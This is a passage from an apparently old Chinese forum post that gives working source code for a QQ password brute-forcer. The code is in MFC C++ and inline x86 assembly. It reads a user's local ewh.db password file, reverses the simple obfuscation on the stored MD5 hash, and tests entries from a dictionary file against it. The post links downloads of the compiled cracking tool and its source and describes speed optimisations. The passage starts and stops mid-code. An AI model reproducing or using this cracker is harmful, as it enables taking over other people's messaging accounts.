
`m_state[2] = 0x98badcfeL;`

`m_state[3] = 0x10325476L;`

`Md5Tranform;`

`m_data[0] = m_state[0];`

`m_data[1] = m_state[1];`

`m_data[2] = m_state[2];`

`m_data[3] = m_state[3];`

```
}
if(memcmp(MD5Result,m_state,16) == 0)        return true;
return false;
```

//fileQQ:QQ密码文件（ewh.db)

//filePwd:密码字典文件(*.txt),格式参见测试用例

```
void CQQDecoderCtrl::Decoder(LPCTSTR fileQQ, LPCTSTR filePwd)
{
        FileQQ        = fileQQ;
        FilePwd = filePwd;
        Me = this;
        //建立解码线程
        DecodeThreadHandle = ::CreateThread(0,0,DecodeThread,0,0,&DecodeThreadId);
        if(!DecodeThreadHandle)
        {
                return;
        }
        ::CloseHandle(DecodeThreadHandle);
}
```

//解密线程
```
DWORD WINAPI CQQDecoderCtrl::DecodeThread(LPVOID arg)
{
        UI32 i;
        UI8 buffer[60];
        CString strPwd;
        BOOL flag;
        PwdNum = 0;
        //读取QQ密码文件
        CFile fQQ(FileQQ,CFile::modeRead);
        fQQ.Read(buffer,60);
        fQQ.Close();
        LoopNum = ((UI32*)buffer)[4];        //得到循环次数
        QQNum = ((UI32*)buffer)[14];        //得到QQ号码
        for(i=0;i<16;i++)        MD5Result[i] = ((~buffer[30+i])^0x10);        //得到md5结果
        //读取密码字典文件
        CFile fPwd(FilePwd,CFile::modeRead);
        CArchive cPwd(&fPwd,CArchive::load);
        //测试密码
        flag = TRUE;
        while(TRUE == flag)
        {
                for(i=0;i<10;i++)
                {
                        flag = cPwd.ReadString(strPwd);
                        if(flag == FALSE)
                        {
                                break;
                        }
                        else
                        {
                                //判断密码是否正确
                                if(true == IsPasswordCorrect((char*)(LPCTSTR)strPwd))
                                {
                                        Pwd = strPwd;
                                        ::PostMessage((HWND)(Me->GetHwnd()),WM_TIMER,2,0);
                                        cPwd.Close();
                                        fPwd.Close();
                                        return 0;
                                }
                        }
                        PwdNum ++;
                }
                //激发已经检查过的密码个数事件
                ::PostMessage((HWND)(Me->GetHwnd()),WM_TIMER,1,0);
        }
        //激发已经检查过的密码个数事件
        ::PostMessage((HWND)(Me->GetHwnd()),WM_TIMER,1,0);
        //激发已经检查完毕事件
        ::PostMessage((HWND)(Me->GetHwnd()),WM_TIMER,3,0);
        //关闭文件
        cPwd.Close();
        fPwd.Close();
        return 0;
}
```

//发送ocx的事件
```
void CQQDecoderCtrl::OnTimer(UINT nIDEvent)
{
        switch(nIDEvent)        //由此来判断该发送什么事件出去
        {
        case 1:        //解密进行中
                this->FireDecoding(PwdNum);
                break;;
        case 2:        //发现新密码
                this->FireValidPwdFound(Pwd);
                break;;
        case 3:        //解密完成
                this->FireDecodeOver(0);
                break;
        }
}
```

`Md5`算法十分清晰。所以，速度不是特别快。根据测试，大约每秒可以测试5个密码。

附件有4个文件，分别是：

`QQSrc.rar`  包含vc编写的ocx源代码和vb编写程序的源代码

`QQ.rar`     包含ocx和vb编写的程序，暴力破解程序就在这里

`test.rar` 包含2个文件：

`ewh.db`     测试密码文件。就是我以前的密码文件，密码现在已经修改了

`pwd.txt`    测试字典文件。

[附件:qq.rar](https://bbs.kanxue.com/bbs.pediy.com/upload/2005/26/files/qq.rar) [附件:qqsrc.rar](https://bbs.kanxue.com/bbs.pediy.com/upload/2005/26/files/qqsrc.rar) [附件:test.rar](https://bbs.kanxue.com/bbs.pediy.com/upload/2005/26/files/test.rar)

### 10.2 号更新

```
。。。。。。。。。。。。。。。。。。
```

QQ暴力破解程序终极优化。

经过认真的排列汇编语言的顺序后，程序现在能做440万次轮转/秒。所以，检测速度上升到10个/秒左右。以下是其主要代码。附件是最新QQ暴力破解程序。

//Md5算法
```
typedef unsigned char UI8;
typedef char I8;
typedef unsigned long UI32;
#define md5_S11 25
#define md5_S12 20
#define md5_S13 15
#define md5_S14 10
#define md5_S21 27
#define md5_S22 23
#define md5_S23 18
#define md5_S24 12
#define md5_S31 28
#define md5_S32 21
#define md5_S33 16
#define md5_S34 9
#define md5_S41 26
#define md5_S42 22
#define md5_S43 17
#define md5_S44 11
#define md5_S110 7
#define md5_S120 12
#define md5_S130 17
#define md5_S140 22
#define md5_S210 5
#define md5_S220 9
#define md5_S230 14
#define md5_S240 20
#define md5_S310 4
#define md5_S320 11
#define md5_S330 16
#define md5_S340 23
#define md5_S410 6
#define md5_S420 10
#define md5_S430 15
#define md5_S440 21
```

//非mmx实现

//思想：

//        a,b,c,d保存在eax,ebx,ecx,edx

//  m_data[0]-m_data[3]保存在mm0,mm1,mm2,mm3

//        esi和edi做temp
```
#define a eax
#define b ebx
#define c ecx
#define d edx
```

//以下结果均在esi中
```
// f(x,y,z) = (x and y) or (not(x) and z)
//                        = ((y xor z) and x) xor z
#define F(x,y,z) \
        __asm mov esi,y \
        __asm xor esi,z \
        __asm and esi,x \
        __asm xor esi,z

//g(x,y,z)        = (x and z) or (y and not(z))
//                        = ((x xor y) and z) xor y
#define G(x,y,z) \
        __asm mov esi,x \
        __asm xor esi,y \
        __asm and esi,z \
        __asm xor esi,y

//h(x,y,z) = x xor y xor z
#define H(x,y,z) \
        __asm mov esi,x \
        __asm xor esi,y \
        __asm xor esi,z

//I(x,y,z) = y xor (x or not(z))
#define I(x,y,z) \
        __asm mov esi,z \
        __asm not esi \
        __asm or esi,x \
        __asm xor esi,y
```

//第一个FF,就是不需要加任何东西上去
```
#define md5_FF0(a0,b0,c0,d0,s0,s1,ac) \
        F(b0,c0,d0) \
        __asm add a0,esi \
        __asm add a0,ac \
        __asm rol a0,s1 \
        __asm add a0,b0
```

//当x数组数据不为0时
```
#define md5_FF1(a0,b0,c0,d0,s0,s1,ac) \
        F(b0,c0,d0) \
        __asm movd edi,mm0 \
        __asm add a0,esi \
        __asm add edi,ac \
        __asm add a0,edi \
        __asm rol a0,s1 \
        __asm add a0,b0

#define md5_FF2(a0,b0,c0,d0,s0,s1,ac) \
        F(b0,c0,d0) \
        __asm movd edi,mm1 \
        __asm add a0,esi \
        __asm add edi,ac \
        __asm add a0,edi \
        __asm rol a0,s1 \
__asm add a0,b0

#define md5_FF3(a0,b0,c0,d0,s0,s1,ac) \
        F(b0,c0,d0) \
        __asm movd edi,mm2 \
        __asm add a0,esi \
        __asm add edi,ac \
        __asm add a0,edi \
        __asm rol a0,s1 \
__asm add a0,b0

#define md5_FF4(a0,b0,c0,d0,s0,s1,ac) \
        F(b0,c0,d0) \
        __asm movd edi,mm3 \
        __asm add a0,esi \
        __asm add edi,ac \
        __asm add a0,edi \
        __asm rol a0,s1 \
__asm add a0,b0
```

//第一个GG,就是不需要加任何东西上去
```
#define md5_GG0(a0,b0,c0,d0,s0,s1,ac) \
        G(b0,c0,d0) \
        __asm add a0,esi \
        __asm add a0,ac \
        __asm rol a0,s1 \
__asm add a0,b0
```

//当x数组数据不为0时
```
#define md5_GG1(a0,b0,c0,d0,s0,s1,ac) \
        G(b0,c0,d0) \
        __asm movd edi,mm0 \
        __asm add a0,esi \
        __asm add edi,ac \
        __asm add a0,edi \
        __asm rol a0,s1 \
__asm add a0,b0

#define md5_GG2(a0,b0,c0,d0,s0,s1,ac) \
        G(b0,c0,d0) \
        __asm movd edi,mm1 \
        __asm add a0,esi \
        __asm add edi,ac \
        __asm add a0,edi \
        __asm rol a0,s1 \
__asm add a0,b0

#define md5_GG3(a0,b0,c0,d0,s0,s1,ac) \
        G(b0,c0,d0) \
        __asm movd edi,mm2 \
        __asm add a0,esi \
        __asm add edi,ac \
        __asm add a0,edi \
        __asm rol a0,s1 \
__asm add a0,b0

#define md5_GG4(a0,b0,c0,d0,s0,s1,ac) \
        G(b0,c0,d0) \
        __asm movd edi,mm3 \
        __asm add a0,esi \
        __asm add edi,ac \
        __asm add a0,edi \
        __asm rol a0,s1 \
__asm add a0,b0
```

//第一个HH,就是不需要加任何东西上去
```
#define md5_HH0(a0,b0,c0,d0,s0,s1,ac) \
        H(b0,c0,d0) \
        __asm add a0,esi \
        __asm add a0,ac \
        __asm rol a0,s1 \
```
